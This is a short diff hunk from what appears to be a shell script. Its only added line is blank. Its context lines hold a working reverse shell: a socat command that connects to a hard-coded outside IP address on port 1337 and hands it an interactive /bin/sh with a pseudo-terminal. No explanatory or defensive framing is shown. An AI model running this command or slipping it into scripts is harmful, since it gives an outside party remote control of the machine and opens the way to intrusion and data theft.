@@ -9,3 +9,4 @@ RHOST=18.219.179.174
 RPORT=1337
 
 socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
+
